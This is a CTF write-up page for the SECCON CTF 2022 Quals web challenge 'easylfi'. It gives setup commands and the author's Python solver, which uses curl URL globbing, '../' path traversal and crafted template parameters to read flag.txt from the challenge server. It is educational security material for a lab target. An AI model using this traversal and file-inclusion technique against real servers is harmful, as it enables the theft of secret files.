---
title: "Easylfi - SECCON CTF 2022 Quals"
category: "web"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "easylfi", "web", "seccon-ctf-2022-quals"]
summary: "Launch a challenge server:"
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202211_SECCON_CTF_2022_Quals/web/easylfi"
license: "none stated"
ctf:
  name: "SECCON CTF 2022 Quals"
  year: 2022
  challenge: "Easylfi"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202211_SECCON_CTF_2022_Quals/web/easylfi>
- **CTF:** SECCON CTF 2022 Quals

---

# [web] easylfi

## Description

Can you read my secret?

- `http://easylfi.seccon.games:3000`

## Attachments

- [easylfi](files/easylfi)

## Usage

Launch a challenge server:

```
cd build
docker compose up
```

Run the author's solver:

```
docker run -it \
    -e SECCON_HOST=localhost \
    -e SECCON_PORT=3000 \
    --network=host \
    (docker build -q ./solver)
```


## Solver: `solver.py`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202211_SECCON_CTF_2022_Quals/web/easylfi/solver/solver.py>

```python
import os
import httpx

BASE_URL = f"http://{os.getenv('SECCON_HOST')}:{os.getenv('SECCON_PORT')}"

res = httpx.get(
    BASE_URL + "/{.}./{.}./{app/public/hello.html,flag.txt}",
    params={
        "{name}": "{",
        "{": "}{",
        "{!</h1>\n</body>\n</html>\n--_curl_--file:///app/public/../../flag.txt\nSECCON}": "",
    },
)

print("SECCON" + res.text.split("<h1>Hello, }")[1])
```
